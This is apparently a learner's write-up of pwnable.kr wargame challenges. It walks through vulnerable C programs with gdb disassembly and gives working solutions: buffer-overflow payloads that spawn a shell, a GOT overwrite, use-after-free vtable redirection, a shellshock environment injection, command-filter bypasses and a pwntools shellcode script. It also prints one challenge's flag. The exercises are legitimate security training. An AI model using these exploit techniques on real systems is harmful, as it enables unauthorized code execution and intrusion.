How to access the challenge in the first place:
1. go to pwnable.kr using a web browser
2. get access to a terminal that can use ssh (since I have Windows, I downloaded a Linux VM on VirtualBox)
3. open a terminal and type in the ssh statement in the challenge description
4. you should have access, you can now use terminal commands like ls to look through the beginning levels for files

-----------------------------------------
Fd

int fd = atoi( argv[1] ) - 0x1234;
int len = 0;
len = read(fd, buf, 32);
if(!strcmp("LETMEWIN\n", buf)){
	printf("good job :)\n");
	system("/bin/cat flag");
	exit(0);
}

This is the important part of the code. On first glance, the obvious thing to manipulate is the fd variable, which can be controlled with input. Then you can use the fd in the read method. But how is that relevant? That requires reading up a little more, but basically if fd is 0, then read takes in input from stdin. 

Since fd is subtracted 0x1234 (or 4660), in order to make fd 0, input a 4660.

That doesn't get you the flag, though - the strcmp function checks if buf (or now your input) is equal to LETMEWIN\n, so just type that into the terminal and you should get your flag.

Solution:
4660
LETMEWIN\n

-----------------------------------------
Collision

unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;
	int i;
	int res=0;
	for(i=0; i<5; i++){
		res += ip[i];
	}
	return res;
}

After looking through the program, I realized that in order to get the flag, the return value of the check_password function must be equivalent to hashcode (0x21DD09EC). But how do I actually get there?

check_password takes in a 20 character string, and essentially reads it in 4 characters at a time and then adds them for the final result. So if you had a string like "\x11" * 20, the return value would be "\x55\x55\x55\x55". So all you basically need to do is come up with five four byte strings that add up to 0x21DD09EC. 

The way I did it makes the five strings add up to 121DD09EC (notice the additional 1 at the front), and it works because res only accounts for the last 8 digits.

I initially came up with the string of "\x33" * 16 + "\x20\x3d\x10\x55", but the final string ends with a 20 (little-endian makes the actual string 55103d20). 
I soon realized though that the program had issues with 0 ending the string, so I had to ensure that the final byte wasn't a 0 in each of the four byte strings. So, I instead had to do "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55".

Solution:
./col $(python -c 'print "\x33" * 12 + "\x32\x33\x33\x33\x21\x3d\x10\x55"')


-----------------------------------------
Bof

void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}

So this particular challenge talked about the issue of buffer overflow. The first thing to realize is that the array overflowme doesn't have a size limit, and as such, giving the array more than 32 characters makes the data you put in overflow into memory you're not supposed to have access to. So we want to overflow the value of key, which currently is 0xdeadbeef, with the value of 0xcafebabe, so that we can end up with a shell. 

The problem now is how much I need to overflow before I can finally access the memory for key. I could just randomly put in A's and then add in a \xfe\xca\xbe\ba, but I instead used gdb to find the exact value. 

I booted up gdb and disassembled the func function to get this in assembly:
gdb-peda$ disas func
Dump of assembler code for function func:
   0x8000062c <+0>:	push   ebp
   0x8000062d <+1>:	mov    ebp,esp
   0x8000062f <+3>:	sub    esp,0x48
=> 0x80000632 <+6>:	mov    eax,gs:0x14
   0x80000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x8000063b <+15>:	xor    eax,eax
   0x8000063d <+17>:	mov    DWORD PTR [esp],0x8000078c
   0x80000644 <+24>:	call   0xb7e630d0 <_IO_puts>
   0x80000649 <+29>:	lea    eax,[ebp-0x2c]
   0x8000064c <+32>:	mov    DWORD PTR [esp],eax
   0x8000064f <+35>:	call   0xb7e62820 <_IO_gets>
   0x80000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x8000065b <+47>:	jne    0x8000066b <func+63>
   0x8000065d <+49>:	mov    DWORD PTR [esp],0x8000079b
   0x80000664 <+56>:	call   0xb7e3e850 <__libc_system>
   0x80000669 <+61>:	jmp    0x80000677 <func+75>
   0x8000066b <+63>:	mov    DWORD PTR [esp],0x800007a3
   0x80000672 <+70>:	call   0xb7e630d0 <_IO_puts>
   0x80000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x8000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x80000681 <+85>:	je     0x80000688 <func+92>
   0x80000683 <+87>:	call   0xb7ef9560 <__stack_chk_fail>
   0x80000688 <+92>:	leave  
   0x80000689 <+93>:	ret   

The important line in all the assembly above is 0x80000654, or func+40. That line compares the value of ebp+8 (presumably key's memory location) with the value of 0xcafebabe. So I set a breakpoint there.

On the way to accessing the breakpoint, I was asked to give input for the overflow me buffer, which I proceeded to overflow with a random amount of A's.

At the breakpoint, I then examine the registers to see where the value of the overflowme variable is.

Since I use gdb-peda, the stack data shown shows me that the variable is at 0xbffff3cc.

0000| 0xbffff3b0 --> 0xbffff3cc ('A' <repeats 47 times>)
0004| 0xbffff3b4 --> 0xbffff454 --> 0x3b2cb624 
0008| 0xbffff3b8 --> 0xb7fb3000 --> 0x1aedb0 
0012| 0xbffff3bc --> 0x9027 
0016| 0xbffff3c0 --> 0xffffffff 
0020| 0xbffff3c4 --> 0x2f ('/')
0024| 0xbffff3c8 --> 0xb7e10dc8 --> 0x2b76 ('v+')
0028| 0xbffff3cc ('A' <repeats 47 times>)

Since I know that overflowme is at 0xbffff3cc and $ebp+8 (aka key variable) is at 0xbffff400, I can calculate that 0xbffff400 - 0xbffff3cc = 52. So I need to overflow 52 characters into overflowme and then add 0xcafebabe to finally overwrite the key variable.

In the solution below, besides the standard python script, the ; cat - is necessary to keep the program open while I utilize the open shell.

Solution:
(python -c 'print "A" * 52 + "\xbe\xba\xfe\xca"'; cat -) | nc pwnable.kr 9000


-----------------------------------------
Flag

So, I initially tried to open the file in GDB, then tried to disassemble the main function. However, GDB told me that it couldn't locate the file in question, which was weird. So I instead took an alternate approach and used the strings command on the flag program, which quickly revealed to me in this particular part of the output:

ACG?
'_(H
USQRH
PROT_EXEC|PROT_WRITE failed.
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $
_j<X
Ph^)-
j2AZE)
/proc/self/exe

that the flags executable was packed with UPX. So I unpacked with UPX (upx -d ./flag) to get a file I can actually disassemble.

gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000401164 <+0>:	push   rbp
   0x0000000000401165 <+1>:	mov    rbp,rsp
   0x0000000000401168 <+4>:	sub    rsp,0x10
   0x000000000040116c <+8>:	mov    edi,0x496658
   0x0000000000401171 <+13>:	call   0x402080 <puts>
   0x0000000000401176 <+18>:	mov    edi,0x64
   0x000000000040117b <+23>:	call   0x4099d0 <malloc>
   0x0000000000401180 <+28>:	mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401184 <+32>:	mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 <flag>
   0x000000000040118b <+39>:	mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040118f <+43>:	mov    rsi,rdx
   0x0000000000401192 <+46>:	mov    rdi,rax
   0x0000000000401195 <+49>:	call   0x400320
   0x000000000040119a <+54>:	mov    eax,0x0
   0x000000000040119f <+59>:	leave  
   0x00000000004011a0 <+60>:	ret    
End of assembler dump.
gdb-peda$ x/10s *0x6c2070
0x496628:	"UPX...? sounds like a delivery service :)"
0x496652:	""
0x496653:	""
0x496654:	""
0x496655:	""
0x496656:	""
0x496657:	""
0x496658:	"I will malloc() and strcpy the flag there. take it."
0x49668c:	"FATAL: kernel too old\n"
0x4966a3:	"/dev/urandom"

The searching for the actual flag was made easier by the comment found in the disassembly.

Solution:
upx -d ./flag
gdb flag
x/10s *0x6c2070

-----------------------------------------
Passcode

Error: I kept piping in input and then wondering why the scanf method refused to accept further input... goes to show that I"m a dumbass and still have a lot to learn. Piped in input essentially is all the input the program's going to receive. Welp. Learned something new.

So the first thing I did was run the program - I checked if passcode could accept 338150 (which it couldn't, it seg faulted). So I then decided to take a look at the welcome function. I wasn't really sure what to expect, but I filled the name array with 100 A's (the welcome function limited input size), and took a look in GDB.

I found that the passcode1 variable is at $ebp-10, passcode2 variable is at $ebp-0c, and that the name array is at $ebp-70. Since the offsets are in hex, 0x70-0x10 = 96. This means that the remaining 4 spots are unaccounted for, and that I'm able to control the value for passcode1. As evidence, when I tested passcode1's value in GDB, it was 0x41414141, which is hex for AAAA.

However, just this alone isn't enough.

printf("enter passcode1 : ");
scanf("%d", passcode1);
fflush(stdin);

The above code in the login function also possesses a bug: scanf should accept &passcode1, not passcode1. As a result, scanf will read in a value and store it at the memory position with passcode1's value. This means that I now can write any value to any place in memory.

Dump of assembler code for function login:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	sub    $0x28,%esp
   0x0804856a <+6>:	mov    $0x8048770,%eax
   0x0804856f <+11>:	mov    %eax,(%esp)
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    $0x8048783,%eax
   0x0804857c <+24>:	mov    -0x10(%ebp),%edx
   0x0804857f <+27>:	mov    %edx,0x4(%esp)
   0x08048583 <+31>:	mov    %eax,(%esp)
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    0x804a02c,%eax
   0x08048590 <+44>:	mov    %eax,(%esp)
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    $0x8048786,%eax
   0x0804859d <+57>:	mov    %eax,(%esp)
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    $0x8048783,%eax
   0x080485aa <+70>:	mov    -0xc(%ebp),%edx
   0x080485ad <+73>:	mov    %edx,0x4(%esp)
   0x080485b1 <+77>:	mov    %eax,(%esp)
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:	movl   $0x8048799,(%esp)
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
=> 0x080485c5 <+97>:	cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	movl   $0x80487a5,(%esp)
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	movl   $0x80487af,(%esp)
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	movl   $0x0,(%esp)
   0x08048604 <+160>:	call   0x8048480 <exit@plt>


The way I did it, I used login+47 (the call to fflush) as a basis to find what to overwrite. Since login+47 calls (or jumps to) the position at 0x8048430, I can instead overwrite the position (which I don't know and shouldn't matter) with login+127's value, which is essentially just system("/bin/cat flag").

Another thing that tripped me was the scanf accepted only %d, so that attempting to give it the hex value for login+127 wouldn't work. Therefore, you have to convert login+127 (0x080485e3) to its decimal component, 134514147.

Solution:
(python -c 'print "A" *96 + "\x04\xa0\x04\x08" + "134514147"') | ./passcode

-----------------------------------------
Random

So the hint given was that random isn't really random. So I booted up GDB, and took a look at the disassembly:

(gdb) disas main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:	push   %rbp
   0x00000000004005f5 <+1>:	mov    %rsp,%rbp
   0x00000000004005f8 <+4>:	sub    $0x10,%rsp
   0x00000000004005fc <+8>:	mov    $0x0,%eax
   0x0000000000400601 <+13>:	callq  0x400500 <rand@plt>
   0x0000000000400606 <+18>:	mov    %eax,-0x4(%rbp)
   0x0000000000400609 <+21>:	movl   $0x0,-0x8(%rbp)
   0x0000000000400610 <+28>:	mov    $0x400760,%eax
   0x0000000000400615 <+33>:	lea    -0x8(%rbp),%rdx
   0x0000000000400619 <+37>:	mov    %rdx,%rsi
   0x000000000040061c <+40>:	mov    %rax,%rdi
   0x000000000040061f <+43>:	mov    $0x0,%eax
   0x0000000000400624 <+48>:	callq  0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:	mov    -0x8(%rbp),%eax
   0x000000000040062c <+56>:	xor    -0x4(%rbp),%eax
   0x000000000040062f <+59>:	cmp    $0xdeadbeef,%eax
   0x0000000000400634 <+64>:	jne    0x400656 <main+98>
   0x0000000000400636 <+66>:	mov    $0x400763,%edi
   0x000000000040063b <+71>:	callq  0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:	mov    $0x400769,%edi
   0x0000000000400645 <+81>:	mov    $0x0,%eax
   0x000000000040064a <+86>:	callq  0x4004d0 <system@plt>
   0x000000000040064f <+91>:	mov    $0x0,%eax
   0x0000000000400654 <+96>:	jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:	mov    $0x400778,%edi
   0x000000000040065b <+103>:	callq  0x4004c0 <puts@plt>
   0x0000000000400660 <+108>:	mov    $0x0,%eax
   0x0000000000400665 <+113>:	leaveq 
   0x0000000000400666 <+114>:	retq   

I see that the key ^ random line takes place at main+56, or the xor command. From that, I can figure out that key is either %rbp-4 or $rbp-8. I just randomly inputted a value and reran the program (changing input values) to figure out that key is located at $rbp-8. This means that $rbp-4 is the random value. I ran the program several times, and each time, $rbp-4 seemed to have the value of 0x6b8b4567.

I then xor'd 0x6b8b4567 with 0xdeadbeef to get 0xb526fb88. However, the job still isn't done, as key accepts an integer value. So I convert 0xb526fb88 to 3039230856 to get my final answer.

Solution:
3039230856

-----------------------------------------
Input - (AKA I don't know how sockets work)

Error: I incorrectly thought that argc was related to the length of the string. Whups. It's actually the amount of arguments (which must be separated by a space - the part I forgot).

Another notable mistake was that I got too caught up in attempting to treat the 0x00 as an actual hex value, rather than the string that it actually was...

You need to set up an actual socket connection (nc -l -k -p 2223 in my case) in order to actually connect to it. Lol, I'm a socket noob.

Below's the working python script as long as the file is on your computer (I understand that the file won't necessarily work as I don't have write permissions on the other server)

This is more of a syntax challenge, which I really don't like personally (because I know jack about syntax).

import struct, os, sys, socket
from subprocess import *

list = ['./a.out']

for i in range(99):
  list.append('A')

list[65] = ''
list[66] = '\x20\x0a\x0d'
list[67] = "2222"

r, w = os.pipe()
r1, w1 = os.pipe()

my_env = os.environ.copy()
my_env["\xde\xad\xbe\xef"] = "\xca\xfe\xba\xbe"

p = Popen(list, stdin=r1, stderr=r, env=my_env)

os.write(w1, "\x00\x0a\x00\xff")
os.write(w, "\x00\x0a\x02\xff")

f = open("\x0a", 'wb')
f.write("\x00\x00\x00\x00")
f.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 2222))
s.send("\xde\xad\xbe\xef")
s.close()

print(p.communicate()[0])

Solution:
Come back to it later...

-----------------------------------------
Leg

key1: it seems to be essentially returning the value of the pc. (0x8cdc)
   0x00008cdc <+8>:  mov   r3, pc
   0x00008ce0 <+12>: mov   r0, r3
   0x00008ce4 <+16>: sub   sp, r11, #0

key2: it seems to return pc + 4 (0x8d04 + 4)
   0x00008d04 <+20>: mov   r3, pc
   0x00008d06 <+22>: adds  r3, #4
   0x00008d08 <+24>: push  {r3}
   0x00008d0a <+26>: pop   {pc}
   0x00008d0c <+28>: pop   {r6}     ; (ldr r6, [sp], #4)
   0x00008d10 <+32>: mov   r0, r3

key3: it returns lr, register containing the return address of the function (0x8d80)
   0x00008d28 <+8>:  mov   r3, lr
   0x00008d2c <+12>: mov   r0, r3

   (main function key3 call)
   0x00008d7c <+64>: bl 0x8d20 <key3>
   0x00008d80 <+68>: mov   r3, r0


= 1A764 (or 108388)

So, the main mistake I made in the comments above is that I don't know ARM (I tried to read it like x86 assembly).

The main thing that I needed to know is that pc doesn't reference the current instruction, but the address of the 2nd instruction after the current one.


So, the more correct version would be 0x8cdc (+ 8 due to ARM pc characteristics) + 0x8d04 + 4 (+ 4 as I skip 2 instructions, not 2 bytes, check above code if confused) + 0x8d80 (lr unaffected).

This gives:  0x8d04+8+0x8cdc+8+0x8d80 = 108400

Solution:
108400

-----------------------------------------
Mistake

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
   int i;
   for(i=0; i<len; i++){
      s[i] ^= XORKEY;
   }
}

int main(int argc, char* argv[]){
   
   int fd;
   if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
      printf("can't open password %d\n", fd);
      return 0;
   }

   printf("do not bruteforce...\n");
   sleep(time(0)%20);

   char pw_buf[PW_LEN+1];
   int len;
   if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
      printf("read error\n");
      close(fd);
      return 0;      
   }

   char pw_buf2[PW_LEN+1];
   printf("input password : ");
   scanf("%10s", pw_buf2);

   // xor your input
   xor(pw_buf2, 10);

   if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
      printf("Password OK\n");
      system("/bin/cat flag\n");
   }
   else{
      printf("Wrong Password\n");
   }

   close(fd);
   return 0;
}

So, at first glance, I don't see anything wrong. Given the hints put out, I understand that the issue is most likely a operator problem. However, as I have little experience with fd in c, I don't understand what to do.

I instead copied the c code onto my own machine so I could compile a new program. When I reran the new program, though, I noticed that the program was accepting input twice.

A little more looking revealed that fd was 0 after this line of code:

   if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
      printf("can't open password %d\n", fd);
      return 0;
   }

This meant that pw_buf was reading in from input, as well as pw_buf2. So I just need to give two inputs ten characters wide that when xor'd give each other as answers. So I used AAAAAAAAAA (41414141414141414141) and @@@@@@@@@@ (40404040404040404040).

Solution:
AAAAAAAAAA
@@@@@@@@@@


-----------------------------------------
Shellshock

#include <stdio.h>
int main(){
   setresuid(getegid(), getegid(), getegid());
   setresgid(getegid(), getegid(), getegid());
   system("/home/shellshock/bash -c 'echo shock_me'");
   return 0;
}

I have no idea where to start. So I looked up a bit on Wikipedia, and I found this line of code: 
env x='() { :;}; echo vulnerable' ./bash -c "echo this is a test".

Supposedly it exploits the shellshock bug, but when I type it into the console, nothing happens when I run the shellshock program. I realize I'm missing something - I look a little further and I see that setresuid() might have a vulnerability with the environment variables... but I have no idea how to make that work.

So, after a little bit of research, I found out you're supposed to use export to bring the environment variable in. 

So the more appropriate solution would be:
export x='() { :;}; /bin/cat flag'. (the latter half of the code above was just a test)

Solution:
export x='() { :;}; /bin/cat flag'
./shellshock

-----------------------------------------
coin1

   ---------------------------------------------------
   -              Shall we play a game?              -
   ---------------------------------------------------
   
   You have given some gold coins in your hand
   however, there is one counterfeit coin among them
   counterfeit coin looks exactly same as real coin
   however, its weight is different from real one
   real coin weighs 10, counterfeit coin weighes 9
   help me to find the counterfeit coin with a scale
   if you find 100 counterfeit coins, you will get reward :)
   FYI, you have 30 seconds.
   
   - How to play - 
   1. you get a number of coins (N) and number of chances (C)
   2. then you specify a set of index numbers of coins to be weighed
   3. you get the weight information
   4. 2~3 repeats C time, then you give the answer
   
   - Example -
   [Server] N=4 C=2  # find counterfeit among 4 coins with 2 trial
   [Client] 0 1      # weigh first and second coin
   [Server] 20       # scale result : 20
   [Client] 3        # weigh fourth coin
   [Server] 10       # scale result : 10
   [Client] 2        # counterfeit coin is third!
   [Server] Correct!

   - Ready? starting in 3 sec... -

N=676 C=10

So, from an early look at this, I figure that I probably need to write a script to deal with this.

My initial approach used a binary search to attempt to look for the coin, as in the example above. 

The script that I used can be found under the name of root.py, which should be in the same folder this writeup is in. I also had to login to one of pwnable.kr's previous challenges and nc 0 9007 to it from there as my connection was too slow originally.

Solution:
ssh mistake@pwnable.kr -p2222 (any ssh to pwnable should be fine)
cd /tmp/
vim root.py
Copy/Paste
python root.py

-----------------------------------------
blackjack

Solution:
Just bet a negative amount of money and lose.

-----------------------------------------
lotto
   
   // calculate lotto score
   int match = 0, j = 0;
   for(i=0; i<6; i++){
      for(j=0; j<6; j++){
         if(lotto[i] == submit[j]){
            match++;
         }
      }
   }


The nested for loop has problems. I just need to input a number with six of the same bytes and hope that one of the bytes is in the random number.

In this case, I just repeatedly entered !!!!!! for my lotto input in the hopes that !(ASCII 33) would be one of the randomly chosen numbers. 

Solution:
!!!!!! (until it outputs flag)

-----------------------------------------
cmd1

#include <stdio.h>
#include <string.h>

int filter(char* cmd){
   int r=0;
   r += strstr(cmd, "flag")!=0;
   r += strstr(cmd, "sh")!=0;
   r += strstr(cmd, "tmp")!=0;
   return r;
}
int main(int argc, char* argv[], char** envp){
   putenv("PATH=/fuckyouverymuch");
   if(filter(argv[1])) return 0;
   system( argv[1] );
   return 0;
}

What's happening in this program is that filter is checking if the argument given has flag, sh, or tmp, in it. If it does, it immediately exits the program. This prevents us from just typing in something like "cat flag" for the argument.

I messed around a bit before determining that since there is no /fuckyouverymuch directory, I would be better off just bypassing the filter. So I did 
./cmd1 "/bin/cat f*" to find the flag.

Solution:
./cmd1 "/bin/cat f*"
mommy now I get what PATH environment is for :)

-----------------------------------------
cmd2

#include <stdio.h>
#include <string.h>

int filter(char* cmd){
   int r=0;
   r += strstr(cmd, "=")!=0;
   r += strstr(cmd, "PATH")!=0;
   r += strstr(cmd, "export")!=0;
   r += strstr(cmd, "/")!=0;
   r += strstr(cmd, "`")!=0;
   r += strstr(cmd, "flag")!=0;
   return r;
}

extern char** environ;
void delete_env(){
   char** p;
   for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
   delete_env();
   putenv("PATH=/no_command_execution_until_you_become_a_hacker");
   if(filter(argv[1])) return 0;
   printf("%s\n", argv[1]);
   system( argv[1] );
   return 0;
}

So, this isn't something I found out on my own, but if you change directory to the topmost parent and call pwd, pwd just returns a /. 

This actually makes the problem so much easier. I just did what you normally do when you try to cat a flag in a folder and replaced the slashes with \$(pwd).

/bin/cat /home/cmd2/f* (I use f* b/c I can't type flag b/c of the filter)

So I would use \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*. (don't forget the two cd ..; statements to access the topmost parent).

Solution:
./cmd2 "cd ..; cd ..; \$(pwd)bin\$(pwd)cat \$(pwd)home\$(pwd)cmd2\$(pwd)f*"

-----------------------------------------
uaf -- go over this again, you're (me) rusty as hell

#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
   virtual void give_shell(){
      system("/bin/sh");
   }
protected:
   int age;
   string name;
public:
   virtual void introduce(){
      cout << "My name is " << name << endl;
      cout << "I am " << age << " years old" << endl;
   }
};

class Man: public Human{
public:
   Man(string name, int age){
      this->name = name;
      this->age = age;
        }
        virtual void introduce(){
      Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
   Human* m = new Man("Jack", 25);
   Human* w = new Woman("Jill", 21);

   size_t len;
   char* data;
   unsigned int op;
   while(1){
      cout << "1. use\n2. after\n3. free\n";
      cin >> op;

      switch(op){
         case 1:
            m->introduce();
            w->introduce();
            break;
         case 2:
            len = atoi(argv[1]);
            data = new char[len];
            read(open(argv[2], O_RDONLY), data, len);
            cout << "your data is allocated" << endl;
            break;
         case 3:
            delete m;
            delete w;
            break;
         default:
            break;
      }
   }

   return 0;   
}

OK, so I needed a little help with this one. After a lot of experimentation and help from Google, I was able to actually decently figure what was going on. It's these few lines in GDB (if you disassemble the main function) that are the trick to solving the problem:

   0x0000000000400fcd <+265>: mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>: mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>: add    rax,0x8
=> 0x0000000000400fd8 <+276>: mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>: mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>: mov    rdi,rax
   0x0000000000400fe2 <+286>: call   rdx

But the problem is getting your saved data value into $rbp-0x38. So I had to experiment with the order of 1, 2, and 3 commands. I know that 3 comes before 1 (so I can abuse the uaf bug), but I don't know how 3 or 2 relate. So I ran GDB multiple times, testing registers before I realized that 3 must be called first, and 2 must be then called twice or more. For some reason one 2 call wasn't enough... I'm assuming that the data needed to be stacked to a certain point on the memory, and one call asn't enough to do that.

So I had to call the program in 3, 2, 2, 1.

The data I input would also then be put into $rbp-0x38, which then according to the assembly, (*rbp-0x38 + 8) would be called by the program. So I obviously want to call the give_shell function in the code, which when examined in the readelf output reveals the vtable to be at 0x401560, and give_shell to beat 0x40117a.

root@kali:~/Downloads# readelf uaf -a | grep Man | c++filt
    57: 00000000004015d0    24 OBJECT  WEAK   DEFAULT   15 typeinfo for Man
    78: 00000000004015c8     5 OBJECT  WEAK   DEFAULT   15 typeinfo name for Man
    83: 0000000000401560    32 OBJECT  WEAK   DEFAULT   15 vtable for Man
    94: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
   100: 0000000000401264   109 FUNC    WEAK   DEFAULT   13 Man::Man(std::basic_string<char, std::char_traits<char>, std::allocator<char> >, int)
   110: 00000000004012d2    54 FUNC    WEAK   DEFAULT   13 Man::introduce()

root@kali:~/Downloads# readelf uaf -a | grep give_shell | c++filt
    85: 000000000040117a    24 FUNC    WEAK   DEFAULT   13 Human::give_shell()

A little looking in GDB reveals that the give_shell value is stored in 0x401570, or vtable+16.

gdb-peda$ x/10x 0x401560
0x401560 <_ZTV3Man>: 0x00000000  0x00000000  0x004015d0  0x00000000
0x401570 <_ZTV3Man+16>: 0x0040117a  0x00000000  0x004012d2  0x00000000
0x401580 <_ZTV5Human>:  0x00000000  0x00000000

So since the program calls (*rbp-0x38 + 8), I need to subtract 8 from 0x401570 to get 0x401568 as my input.

Solution:
(python -c 'print "\x68\x15\x40\x00" + "\x00" * 4') > /tmp/test
./uaf 8 /tmp/test (8 is just the size of a byte)
3
2
2
1

Tips I learned: set print asm-demangle on (C++, makes things legible)
                use readelf when unable to find function locations
                (readelf -a uaf | grep Man | c++filt in this case)
                scp -P2222 uaf@pwnable.kr:uaf /root/Downloads to copy from pwnable.kr


-----------------------------------------
codemap

You need IDA Pro codemap. I'll come back when I have it. or not...



-----------------------------------------
memcpy

So, for this particular challenge, I had no idea what to do, so I just bruteforced it with a script. Luckily enough, it didn't take much to bruteforce. As for my script, I wrote a really lazy version where I initially started out with an array like:
[8, 16, 32, 64, 128, 256, 512, 1024, 2048, 4096]
and I would increment a certain position depending on the program output.

For example, if the output stopped on experiment 5, that most likely meant the value in input[3] was off. So I had a loop (it's in memcpy.py, a very lazily written script) that kept incrementing input[3] until I got the text output for experiment 6 (or at least part of it). That means the value in input[4] was off. So I continued on and on until I got the flag.

flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
(just because I really don't want to brute force it again)

Solution:
python memcpy.py
(then edit script as necessary)

-----------------------------------------
asm

from pwn import *

con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)
p = con.connect_remote('localhost', 9026)

context(arch='amd64', os='linux')

shellcode = ''
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100)


print(shellcode)

p.recvuntil('shellcode: ')
p.send(asm(shellcode))
output = p.recvline()
print(output)

I found a really convenient way to send shellcode online. Obviously I'm keeping this saved (not my work ofc) for future reference here.


-----------------------------------------
unlink

So, for this particular challenge, what I did continually put in input and observe the results from the program (all in assembly/GDB of course). The first thing I did was send in a string like "AAAABBBBCCCCDDDDEEEEFFFFGGGG". 

THe unlink method is obviously of the most interest, so I took a look at the assembly there. There, the assembly attempted to store the value of FFFF into the memory at EEEE and the value of EEEE at the memory of FFFF. I first attempted to overwrite the next instruction address with the memory address of the shell function conveniently given, but nothing happened. SO, I need to try something else.

Going on, I notice something interesting in the code AFTER the method has been returned. Namely, this: 

   0x80485f7 <main+200>:   add    esp,0x10
=> 0x80485fa <main+203>:   mov    eax,0x0
   0x80485ff <main+208>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x8048602 <main+211>:   leave  
   0x8048603 <main+212>:   lea    esp,[ecx-0x4]

The lea is particularly relevant, and even more so when you take a closer look at the unlink disassembly.

   0x08048504 <+0>:  push   ebp
   0x08048505 <+1>:  mov    ebp,esp
   0x08048507 <+3>:  sub    esp,0x10
   0x0804850a <+6>:  mov    eax,DWORD PTR [ebp+0x8]
   0x0804850d <+9>:  mov    eax,DWORD PTR [eax+0x4]
   0x08048510 <+12>: mov    DWORD PTR [ebp-0x4],eax
   0x08048513 <+15>: mov    eax,DWORD PTR [ebp+0x8]
   0x08048516 <+18>: mov    eax,DWORD PTR [eax]
   0x08048518 <+20>: mov    DWORD PTR [ebp-0x8],eax
   0x0804851b <+23>: mov    eax,DWORD PTR [ebp-0x8]
   0x0804851e <+26>: mov    edx,DWORD PTR [ebp-0x4]
   0x08048521 <+29>: mov    DWORD PTR [eax+0x4],edx
   0x08048524 <+32>: mov    eax,DWORD PTR [ebp-0x4]
   0x08048527 <+35>: mov    edx,DWORD PTR [ebp-0x8]
   0x0804852a <+38>: mov    DWORD PTR [eax],edx
   0x0804852c <+40>: nop
   0x0804852d <+41>: leave  
   0x0804852e <+42>: ret    

Essentially, this method is doing this:
$ebp-0x4 = FFFF
$ebp-0x8 = EEEE

eax = EEEE
edx = FFFF
$eax = edx
eax = FFFF
edx = EEEE
$eax = edx

The relevant part is that $ebp-0x4 is controlled by me, and is currently FFFF in this session. Great! However, I need to take into account this:

   0x0804852d <+41>: leave  

This alters my base pointer by changing it back to what it was before (but luckily I can see using GDB)

